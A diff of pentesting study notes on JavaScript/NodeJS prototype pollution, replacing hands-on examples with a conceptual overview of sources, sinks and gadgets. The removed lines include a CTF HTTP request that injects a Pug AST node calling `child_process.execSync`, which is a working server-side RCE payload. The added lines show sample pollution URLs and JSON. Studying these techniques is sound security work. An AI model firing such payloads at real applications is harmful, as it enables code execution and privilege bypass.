@@ -1,175 +1,80 @@
->[!tip]
->Cheatsheets and further information can be found at [NodeJS - __proto__ & prototype Pollution](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)
+# Prototype Pollution 101
 
-# NodeJS and JavaScript
+> [!question] What is Prototype Pollution?
+>Prototype pollution is a [JavaScript & NodeJS](../Dev,%20scripting%20&%20OS/JavaScript%20&%20NodeJS.md) (but not only!) vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects.
 
-See also [JavaScript & NodeJS](../Dev,%20scripting%20&%20OS/JavaScript%20&%20NodeJS.md)
+It lets an attacker control properties of objects that would otherwise be inaccessible. If the application subsequently handles an attacker-controlled property in an unsafe way, this can potentially be chained with other vulnerabilities, like [DOM-based vulnerabilities](DOM-based%20vulnerabilities.md) for client-side prototype pollution, or even [Remote Code Execution (RCE)](Remote%20Code%20Execution%20(RCE).md) for server-side ones.
 
-## `__proto__` pollution
+# High level overview
 
->[!warning]
->Every object in JavaScript is simply a collection of key and value and every object inherits from the Object type in JavaScript. If you are able to pollute the Object type **each JavaScript object of the environment is going to be polluted!**
+Prototype pollution vulnerabilities typically arise when a function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys. This can allow an attacker to inject a property with a key like `__proto__`, along with arbitrary nested properties.
 
-This is fairly simple, you just need to be able to modify some properties (key-value pairs) from an arbitrary JavaScript object, because as **each object inherits from `Object`**, **each object can access `Object` scheme**.
+It's possible to pollute any prototype object, but this most commonly occurs with the built-in global `Object.prototype.
 
-```jsx
-function person(fullName) {
-    this.fullName = fullName;
-}
+Successful exploitation of prototype pollution requires the following components:
 
-var person1 = new person("0xbro");
-```
+1. **A prototype pollution source**: input that enables you to poison prototype objects with arbitrary properties
+2. **A sink**: a JavaScript function or DOM element that enables arbitrary code execution.
+3. **An exploitable gadget**: any property that is passed into a sink without proper filtering or sanitization.
 
-From the previous example it's possible to **access the structure of `Object`** using the following ways:
+## Prototype pollution sources
 
-```jsx
-> person1.__proto__.__proto__
-> person.__proto__.__proto__
+A prototype pollution source is any user-controllable input that enables you to add arbitrary properties to prototype objects.
 
-> person1.__proto__.__proto__ === person.__proto__.__proto__
-true
-```
+The most common are:
+- URL (either the query or fragment string)
+  >[!example] 
+  >`https://vulnerable-website.com/?__proto__[evilProperty]=payload`
 
-If now a property is added to the Object scheme, every JavaScript object will have access to the new property:
+- JSON-based input (eg. `JSON.parse()`)
+  >[!example]
+  >```json
+  >{
+    >"__proto__": {
+>        "evilProperty": "payload"
+>    }
+>}
+>```
+- Web messages
 
-```jsx
-> person1.__proto__.__proto__.printHello = function(){console.log("Hello");}
-function printHello()
+## Prototype pollution sinks
 
-> person1.printHello()
-Hello
+A prototype pollution sink is essentially just a JavaScript function or DOM element that you're able to access via prototype pollution, which enables you to execute arbitrary JavaScript or system commands. You can find some examples in [DOM-based vulnerabilities](DOM-based%20vulnerabilities.md).
 
-> var test = {}
-undefined
+## Prototype pollution gadgets
 
-> test.printHello()
-Hello
-```
+A gadget provides a means of turning the prototype pollution vulnerability into an actual exploit.
 
-Now **each JS object** will contain the new properties!****
+This is any property that is:
 
-## `prototype` pollution
+- Used by the application in an unsafe way, such as passing it to a sink without proper filtering or sanitization.
+- Attacker-controllable via prototype pollution. In other words, the object must be able to inherit a malicious version of the property added to the prototype by an attacker.
 
->[!warning]
->If you are able to modify the properties of a function, you can modify the `prototype` property of the function and **each new property that you adds here will be inherit by each object created from that function.**
+>[!example]
+>
+>Many JavaScript libraries accept an object that developers can use to set different configuration options. The library code checks whether the developer has explicitly added certain properties to this object and, if so, adjusts the configuration accordingly. If a property that represents a particular option is not present, a predefined default option is often used instead.
+>
+>```js
+let transport_url = config.transport_url || defaults.transport_url;
+>```
+>
+>Now imagine the library code uses this `transport_url` to add a script reference to the page:
+>
+>```js
+let script = document.createElement('script');
+script.src = `${transport_url}/example.js`;
+document.body.appendChild(script);
+>```
+>
+>If the website's developers haven't set a `transport_url` property on their `config` object, this is a potential gadget. In cases where an attacker is able to pollute the global `Object.prototype` with their own `transport_url` property, this will be inherited by the `config` object and, therefore, set as the `src` for this script to a domain of the attacker's choosing.
 
-```jsx
-function person(fullName) {
-    this.fullName = fullName;
-}
-var person1 = new person("0xbro");
-var person2 = new person("maoutis");
-var person3 = new person("testname");
-```
+---
 
-If I pollute a property of the **person** function, every object instantiated from **that function** is now polluted:
+# Prototype pollution vulnerabilities
 
-```jsx
-> person.prototype.sayHello = function(){console.log("Hello");} // Add function as new property
-function sayHello()
-
-> person1.sayHello(); // inherits the function
-Hello
-undefined
-> person2.sayHello(); // inherits the function
-Hello
-
-> person3.constructor.prototype.sayHelloBis = function(){console.log("HelloBis");} // Add function as new property using the constructor reference 
-function sayHelloBis()
-
-> person3.sayHelloBis(); // inherits the function
-HelloBis
-
-> person2.sayHelloBis(); // inherits the function 
-HelloBis
-
-> var test = {};
-undefined
-> test.sayHello();
-Uncaught TypeError: test.sayHello is not a function // Error because the variable is not instanciated from "**person"**
-```
-
-There are 2 ways to abuse prototype pollution to poison **EVERY** JS object (like with `__proto__`).
-
-- pollute the property prototype of **`Object`**
-
-```jsx
-Object.prototype.sayBye = function(){console.log("bye!")}
-```
-
-- poison the prototype of a constructor of a dictionary variable
-
-```jsx
-something = {"a": "b"}
-something.constructor.prototype.sayHey = function(){console.log("Hey!")}
-```
-
-## Array elements pollution
-
-Note that as you can pollute attributes of objects in JS, if you have access to pollute an array you can also **pollute values of the array** accessible **by indexes** (note that you cannot overwrite values, so you need to pollute indexes that are somehow used but not written).
-
-```jsx
-c = [1,2]
-a = []
-a.constructor.prototype[1] = "yolo"
-b = []
-b[0] //undefined
-b[1] //"yolo"
-c[1] // 2 -- not
-```
-
-## Practical Examples
-
-So where’s the prototype pollution? It happens when there’s a bug in the application that makes it possible to overwrite properties of `Object.prototype`. Since every typical object inherits its properties from `Object.prototype`, we can change application behaviour. The most commonly shown example is the following:
-
-```jsx
-if (user.isAdmin) {   // do something important!}
-```
-
-Imagine that we have a prototype pollution that makes it possible to set `Object.prototype.isAdmin = true`. Then, unless the application explicitly assigned any value, `user.isAdmin` is always true!
-
-### Attacker controlling the index of an array and the corresponding assigned value
-
-For example, `obj[a][b] = value`. If the attacker can control the value of `a` and `value`, then he only needs to adjust the value of `a`to `__proto__`(in javascript, `obj["__proto__"]` and `obj.__proto__`are completely equivalent) then property `b` of all existing objects in the application will be assigned to `value`.
-
-However, the attack is not as simple as the one above, according to [paper](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf), we can only attack when one of the following three conditions is met:
-
-- Perform recursive merge
-- Property definition by path
-- Clone object
-
-# AST Prototype Pollution
-
-In NodeJS, AST is used in JS really often, as template engines and typescript etc. For the template engine, the structure is as shown above, and the most used two are **Handlebars** and **Pug**. [^1]
-
-[^1]:  https://blog.p6.is/AST-Injection/
-
-![|1000](../../zzz_res/attachments/ast1.png)
-
-![|1000](../../zzz_res/attachments/ast2.png)
-
-### Pug
-
-Example from [Gunship](https://www.notion.so/Gunship-d7aa8f7841234d1c993ba55c44ab5191) 
-
-```http
-POST /api/submit HTTP/1.1
-Host: 134.209.28.38:30545
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
-Accept: */*
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://127.0.0.1:1337/
-Content-Type: application/json
-Origin: http://127.0.0.1:1337
-Content-Length: 185
-Connection: close
-
-{
-    "__proto__.block": {
-        "type": "Text", 
-        "line": "process.mainModule.require('child_process').execSync('mkdir $(cat flagtZ1pK)')"
-    },
-"artist.name":"Haigh"
-}
-```
+- [Prototype Pollution client-side](Prototype%20Pollution%20client-side.md)
+	- [JavaScript prototype pollution examples](Prototype%20Pollution%20client-side.md#JavaScript%20prototype%20pollution%20examples)
+- [Prototype Pollution server-side](Prototype%20Pollution%20server-side.md)
+	- [NodeJS prototype pollution examples](Prototype%20Pollution%20server-side.md#NodeJS%20prototype%20pollution%20examples)
+	- [AST Prototype Pollution](Prototype%20Pollution%20server-side.md#AST%20Prototype%20Pollution)
+- [Class Pollution](Class%20Pollution.md)
